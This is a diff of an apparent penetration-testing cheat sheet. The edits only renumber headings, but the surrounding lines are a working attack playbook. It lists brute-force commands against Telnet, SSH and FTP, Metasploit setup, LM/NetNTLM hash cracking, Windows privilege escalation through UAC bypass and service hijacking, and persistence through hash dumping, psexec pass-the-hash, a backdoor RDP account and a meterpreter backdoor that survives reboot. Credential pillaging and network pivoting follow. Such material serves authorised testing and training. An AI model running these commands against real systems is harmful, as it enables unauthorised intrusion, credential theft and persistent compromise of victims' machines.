@@ -126,14 +126,14 @@ $ sudo nano /etc/ettercap/etter.conf // set uid and gid to 0
 // Additionally, uncomment appropriate redir_command_on/off (in my case, iptables)
 ```
 #### 1.3 Exploitation  
-_1.2.1 Cracking Service Authentication_  
+_1.3.1 Cracking Service Authentication_  
 ```
 $ ncrack -vv -U usernames.txt -P passwords.txt targetIP -p telnet // Run Ncrack in verbose mode using a usernames and password file against the Telnet protocol
 $ medusa -h targetIP -M ssh -U usernames.txt -P passwords.txt // Run Medusa using usernames and passwords lists against the SSH service, offers more protocols than ncrack
 $ hydra -L usernames.txt -P passwords.txt ftp://targetIP // Run Hydra with usernames and password file against FTP, fast
 $ patator ftp_login host=FILE0 user=FILE1 password=FILE2 0=hostslist.txt 1=usernames.txt 2=passwords.txt -x ignore:mesg=”Login incorrect.” // Patator offers more modules and protocol support, and highly customizable. Man page at $vim /usr/bin/patator
 ```
-_1.2.2 Metasploit Framework_  
+_1.3.2 Metasploit Framework_  
 ```
 $ sudo msfupdate
 $ sudo service postgresql start
@@ -159,8 +159,8 @@ $ sudo rcracki_mt -h <first 8bits (16chars) of LM hash> -t 4 *.rti // uses a fol
 $ locate netntlm
 $ sudo perl netntlm.pl --file <netntlm hashes file> --seed <discovered plaintext from first 8 bytes> 
 ```
-#### 1.3 Post-Exploitation  
-_1.3.1 Privilege Escalation_
+#### 1.4 Post-Exploitation  
+_1.4.1 Privilege Escalation_
 ```
 > run post/windows/gather/win_privs
 // if no admin privs, and UAC is enabled, can search uac for modules like:
@@ -186,7 +186,7 @@ c:\ProgramFiles\Directory> icacls "Directory Containing Vulnerable Service"
 > set AutoRunScript migrate -n svchost.exe
 // start the identified service -- should get shell.
 ```
-_1.3.2 Persistence_  
+_1.4.2 Persistence_  
 ```
 > run post/windows/gather/smart_hashdump && > creds // dumps hashes, stores them locally, list hashes with creds command
 > use exploit/windows/smb/psexec // set SMBUser and SMBPass (collected hash) for persistence on target
@@ -198,7 +198,7 @@ $ xfreerdp /v:TargetIP:3389 /u:atk /p:atk // RDP into machine with created user
 
 msf> use exploit/windows/local/persistence // Set STARTUP type SYSTEM or USER, set SESSION, and set PAYLOAD (meterpreter), LHOST/LPORT. Use handler with same config as persistence module. Backdoor survives system restart.
 ```
-_1.3.3 Pillaging_
+_1.4.3 Pillaging_
 ```
 > run post/windows/gather/ <-- lots of modules
   enum_applications, /credentials/, credential_collector
@@ -223,7 +223,7 @@ c:\> netstat -ano // displays all active connections on victim machine
 > use post/multi/gather/ping_sweep // Uses the victim machine to ping sweep ip range. Set session.
 > run arp_scanner -r <TargetCIDR or Range> // performs ARP discovery scan using victim machine
 ```
-_1.3.3 Pivoting_
+_1.4.4 Pivoting_
 ```
 Configure Pivoting Envrionment
 > use post/windows/manage/autoroute // add target subnet and session id
